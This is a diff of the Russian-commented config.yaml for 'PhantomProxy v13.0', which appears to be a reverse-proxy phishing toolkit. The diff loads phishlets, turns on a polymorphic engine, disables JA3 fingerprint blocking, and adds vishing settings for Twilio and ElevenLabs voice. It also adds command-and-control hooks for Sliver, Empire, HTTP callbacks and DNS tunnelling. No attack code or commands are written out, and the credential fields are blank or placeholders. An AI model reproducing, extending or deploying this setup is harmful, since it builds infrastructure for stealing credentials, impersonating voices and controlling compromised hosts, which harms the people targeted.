@@ -1,11 +1,11 @@
-# PhantomProxy Configuration File
+# PhantomProxy Configuration File v13.0
 # Сохраните как config.yaml
 
 # Сеть
 bind_ip: "0.0.0.0"
-https_port: 443
-http3_port: 443
-http3_enabled: true
+https_port: 8443
+http3_port: 8443
+http3_enabled: false
 
 # Домен и сертификаты
 domain: "phantom.local"
@@ -16,23 +16,18 @@ key_path: "./certs/key.pem"
 # База данных
 database_path: "./phantom.db"
 database_type: "sqlite"
-# postgres_url: "postgres://user:pass@localhost:5432/phantom"
-# redis_url: "redis://localhost:6379"
 
 # Phishlets
 phishlets_path: "./configs/phishlets"
 
 # Безопасность
-ja3_enabled: true
-ja3_blocklist: []
+ja3_enabled: false
 ml_detection: false
 ml_threshold: 0.75
-blacklist_path: "./configs/blacklist.txt"
-whitelist_path: "./configs/whitelist.txt"
 
 # Polymorphic engine
 polymorphic_enabled: true
-polymorphic_level: "high"  # low, medium, high
+polymorphic_level: "high"
 
 # Service Worker
 serviceworker_enabled: true
@@ -40,15 +35,69 @@ serviceworker_enabled: true
 # WebSocket
 websocket_enabled: true
 
-# Cloudflare Workers
-cloudflare_worker_enabled: false
-cloudflare_worker_url: ""
-cloudflare_worker_secret: ""
-
 # Уведомления
 telegram_enabled: false
 telegram_token: ""
 telegram_chat_id: 0
+
+# API
+api_enabled: true
+api_port: 8080
+api_key: "change-me-to-secure-random-string"
+
+# Multi-tenant
+multi_tenant_enabled: false
+
+# Risk Score
+risk_score_enabled: true
+risk_threshold_high: 80
+risk_threshold_critical: 95
+
+# Vishing
+vishing_enabled: false
+vishing_provider: "twilio"
+twilio_account_sid: ""
+twilio_auth_token: ""
+twilio_phone_number: ""
+elevenlabs_api_key: ""
+smsru_api_key: ""
+
+# FSTEC Compliance
+fstec_enabled: false
+fstec_encrypt_logs: true
+fstec_category: "УЗ-2"
+
+# AI Service
+ai_service_enabled: true
+ai_service_url: "http://localhost:8081"
+ai_rag_enabled: true
+
+# Логирование
+debug: false
+log_path: "./logs/phantom.log"
+log_level: "info"
+
+# PhantomProxy v13
+v13:
+  c2:
+    sliver:
+      enabled: false
+      server_url: ""
+      operator_token: ""
+      callback_host: ""
+    empire:
+      enabled: false
+      server_url: ""
+      username: ""
+      password: ""
+    http_callback:
+      enabled: false
+      callback_url: ""
+      headers: []
+    dns_tunnel:
+      enabled: false
+      domain: ""
+      chunk_size: 60
 
 discord_enabled: false
 discord_webhook_url: ""
